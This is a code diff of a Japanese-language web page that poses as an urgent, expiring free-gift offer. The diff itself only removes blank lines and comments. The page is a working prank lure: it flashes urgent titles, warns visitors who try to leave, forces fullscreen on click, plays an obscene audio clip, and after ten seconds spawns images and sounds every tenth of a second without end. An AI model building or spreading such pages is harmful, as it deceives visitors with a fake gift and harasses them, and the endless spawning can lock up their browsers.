@@ -14,7 +14,6 @@
             background-color: #000;
             color: #fff;
         }
-
         button {
             padding: 25px 50px;
             font-size: 28px;
@@ -28,7 +27,6 @@
             border-radius: 50px;
             box-shadow: 0 0 30px rgba(255, 71, 87, 0.8);
         }
-
         .gift-image {
             position: absolute;
             width: 150px;
@@ -36,7 +34,6 @@
             z-index: 1;
             animation: popIn 0.1s ease-out;
         }
-
         @keyframes popIn {
             0% { transform: scale(0) rotate(-45deg); opacity: 0; }
             100% { transform: scale(1) rotate(0deg); opacity: 1; }
@@ -44,58 +41,41 @@
     </style>
 </head>
 <body>
-
     <h1>【重要】未受取の豪華ギフトが届いています</h1>
     <p>有効期限が間もなく切れます。至急受け取りボタンを押してください。</p>
-
     <button id="show-btn">今すぐ無料で受け取る</button>
-
     <div id="image-container"></div>
-
     <script>
         const btn = document.getElementById('show-btn');
         const container = document.getElementById('image-container');
         const imgSize = 150;
-
-        // タイトル点滅
         let blink = false;
         setInterval(() => {
             document.title = blink ? "【要確認】" : "！！！入手！！！";
             blink = !blink;
         }, 500);
-
-        // 閉じようとした時の警告
         window.onbeforeunload = function() {
             return "ギフトが破棄されますがよろしいですか？";
         };
-
         function spawnGift() {
-            // 画像の生成
             const newImg = document.createElement('img');
             newImg.src = 'slowparrot.gif';
             newImg.className = 'gift-image';
-
             const x = Math.random() * (window.innerWidth - imgSize);
             const y = Math.random() * (window.innerHeight - imgSize);
             newImg.style.left = x + 'px';
             newImg.style.top = y + 'px';
             container.appendChild(newImg);
-
-            // 【改良】サウンド再生（独立したインスタンスを作成）
             const audio = new Audio('fuckyou.mp3');
-            audio.play().catch(e => { /* 自動再生ブロック用 */ });
+            audio.play().catch(e => {});
         }
-
         btn.addEventListener('click', function() {
-            // 初回クリックで全画面へ
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             }
             spawnGift();
             btn.textContent = 'もっと受け取る！！';
         });
-
-        // 10秒後に0.1秒間隔の無限増殖を開始
         setTimeout(function() {
             setInterval(function() {
                 spawnGift();
